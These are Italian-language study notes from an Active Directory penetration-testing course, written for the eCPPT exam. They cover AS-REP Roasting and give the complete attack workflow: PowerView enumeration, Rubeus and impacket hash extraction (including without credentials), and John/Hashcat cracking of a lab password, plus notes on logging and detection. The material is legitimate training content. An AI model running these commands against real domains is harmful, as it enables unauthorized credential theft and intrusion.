# 010 — AS-REP Roasting (Active Directory Penetration Testing)

> **Modulo:** Active Directory Penetration Testing · **Video:** 10/15
> **Istruttore:** Alexis Ahmed (HackerSploit / INE)
> **Fonte appunti:** [010_AS-REP Roasting.txt](010_AS-REP Roasting.txt) · [010_AS-REP Roasting.srt](010_AS-REP Roasting.srt)

## Concetti chiave

- **AS-REP Roasting** sfrutta utenti con il flag **`DONT_REQ_PREAUTH`** (Do not require Kerberos pre-authentication) impostato.
- Senza preauth il KDC risponde all'**AS-REQ** con un **AS-REP** cifrato con la chiave derivata dalla **password dell'utente** → crackable **offline**.
- Più che una vulnerabilità del protocollo è una **misconfigurazione** dell'account.
- Workflow: **enum utenti vulnerabili → richiesta AS-REP (Rubeus) → crack offline (John/Hashcat)**.
- Tipicamente classificato come **Privilege Escalation / Lateral Movement** in contesto AD.
- Lab dimostrato: utente `Johnny` → password `123456` (cracked con John + `10k-worst-passwords.txt`).

## Spiegazione approfondita

### Background Kerberos
Nel flusso normale Kerberos il client manda un **AS-REQ** al KDC contenente il **timestamp cifrato con la sua key** (preauthentication). Il KDC risponde con un **AS-REP** che contiene il **TGT** (cifrato con la key di `KRBTGT`) **e** una **session key cifrata con la key dell'utente**.

### Perché funziona AS-REP Roasting
Se un account ha il flag **`DONT_REQ_PREAUTH`** abilitato (visto nel video 02 come opzione UAC nelle proprietà account):
- Chiunque può richiedere un AS-REP per quell'account **senza dimostrare di conoscere la password** (no preauth timestamp).
- La parte dell'AS-REP cifrata con la chiave dell'utente diventa un **oracolo offline**: chi la cattura può tentare di crackarla offline, provando password candidate, derivandone la chiave Kerberos, e verificando la decifratura.
- Se la password è debole → recupero **plaintext password** senza interagire ulteriormente con il dominio (zero rumore dopo la richiesta).

### Requisiti
- Una **valid domain account** (qualsiasi user — non serve admin) per fare la query in modo standard, **oppure** la sola conoscenza del **SAM account name** vulnerabile (con `Rubeus` o `impacket-GetNPUsers` si può anche fare senza credenziali se si conosce il username).
- Almeno **un utente nel dominio** con `DONT_REQ_PREAUTH=True`.

### Workflow del lab
1. **Enumerazione utenti vulnerabili** via PowerView.
2. **Roasting** con **Rubeus**: ottieni l'AS-REP hash.
3. **Crack** con **John the Ripper** + wordlist (`10k-worst-passwords.txt`).
4. Output: plaintext password (`123456` per `Johnny`).

### Cosa fare con un AS-REP hash
- **Crack offline** → ottenere plaintext password → autenticarsi come l'utente.
- (Nota dal video) Alexis menziona anche pass-the-hash, ma **attenzione**: l'hash AS-REP **non è** un NTLM hash; va prima crackato. Il pass-the-hash classico richiede il NT hash dell'utente.

### Identificazione utenti vulnerabili
Comando PowerView mostrato nel video:
```powershell
Get-DomainUser | Where-Object { $_.UserAccountControl -like '*DONT_REQ_PREAUTH*' }
```
(Equivalente più pulito: `Get-DomainUser -PreauthNotRequired`, citato nel video 09.)

Alternative menzionate o standard:
- Da **BloodHound**: query *List all AS-REP Roastable Users* (video 08).
- Da **impacket** (senza credenziali, solo userlist): `GetNPUsers.py`.

## Comandi & strumenti

| Comando | Scopo | Note |
|---|---|---|
| `powershell -ep bypass` | Abilita esecuzione script | |
| `. .\PowerView.ps1` | Import PowerView | |
| `Get-DomainUser \| Where-Object { $_.UserAccountControl -like '*DONT_REQ_PREAUTH*' }` | Enum utenti AS-REP roastable | Comando esatto del video |
| `Rubeus.exe asreproast /user:<user> /outfile:<file>` | Richiede AS-REP e salva l'hash | Path lab: `C:\Tools\Rubeus.exe` |
| `john.exe <hashfile> --format=krb5asrep --wordlist=<wordlist>` | Crack offline con John the Ripper | `--format=krb5asrep` è obbligatorio |
| **Rubeus** | Toolkit Kerberos in C# | Indispensabile in AD pentest |
| **John the Ripper** (Windows build) | Hash cracker | Usato dal lab, alternativa: hashcat (`-m 18200`) |
| `10k-worst-passwords.txt` | Wordlist del lab | Path: `C:\Tools\` |

## Esempi pratici

```powershell
# 1. Setup
powershell -ep bypass
cd C:\Tools
. .\PowerView.ps1

# 2. Enum AS-REP roastable users
Get-DomainUser | Where-Object { $_.UserAccountControl -like '*DONT_REQ_PREAUTH*' }
# Output: Johnny

# 3. Estrazione hash con Rubeus
.\Rubeus.exe asreproast /user:Johnny /outfile:johnny_hash.txt
# Output: "AS-REQ without pre-auth successful"
# File johnny_hash.txt contiene un hash $krb5asrep$...

# 4. Crack con John the Ripper
cd .\JohnTheRipper\run\
.\john.exe johnny_hash.txt --format=krb5asrep --wordlist=10k-worst-passwords.txt
# Output: 123456    (Johnny)
```

```bash
# Alternativa Linux con impacket (anche senza credenziali, solo username list)
impacket-GetNPUsers research.security.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hashes

# Crack con hashcat (mode 18200)
hashcat -m 18200 asrep.hashes wordlist.txt
```

## Punti d'attenzione per l'esame eCPPT

- **Prerequisito assoluto**: account con flag **`DONT_REQ_PREAUTH`** (alias UAC: *Do not require Kerberos preauthentication*). Senza questo, AS-REP Roasting **non è possibile**.
- L'AS-REP è cifrato con la **chiave derivata dalla password dell'utente target** → crackable offline.
- **Differenza con Kerberoasting** (domanda quasi certa):
  - AS-REP Roasting target = **user account con preauth disabilitata**; ottieni un **AS-REP** hash.
  - Kerberoasting target = **service account con SPN**; ottieni un **TGS** hash.
  - Entrambi crackable offline ma con tipi di hash diversi.
- **Formati hash da memorizzare**:
  - AS-REP → John `--format=krb5asrep`, Hashcat **`-m 18200`**.
  - Kerberoast → John `--format=krb5tgs`, Hashcat `-m 13100`.
- **Rubeus** è il tool d'elezione su Windows: `Rubeus.exe asreproast /user:<user> /outfile:<file>` (o senza `/user` per enumerare e roastare tutti).
- **impacket `GetNPUsers.py`** è l'equivalente Linux e può funzionare **senza credenziali** se si conosce un username list (utile da box esterna).
- Nota: AS-REP Roasting **non genera un Event 4768 sospetto** (è una richiesta TGT legittima per il KDC), ma alcuni sistemi monitorano l'assenza di preauth.
- Si può **enumerare senza autenticazione** se il dominio risponde a query anonime (raro), altrimenti serve almeno un domain user.
- La PowerView one-liner mostrata nel video (`Where-Object { $_.UserAccountControl -like '*DONT_REQ_PREAUTH*' }`) potrebbe essere oggetto di domanda — meglio conoscere anche la forma compatta `Get-DomainUser -PreauthNotRequired`.

## Collegamenti con altri video

- Precedente: [[09_AD Enumeration_ PowerView]] — il comando di enumerazione viene da qui.
- Prossimo: [[011_Kerberoasting]] — l'altro attacco Kerberos, complementare.
- Origine dell'opzione: [[02_Users, Groups & Computers]] (Account Options).
- Teoria Kerberos: [[04_Active Directory Authentication]]
- Identificazione target via grafo: [[08_AD Enumeration_ BloodHound]]
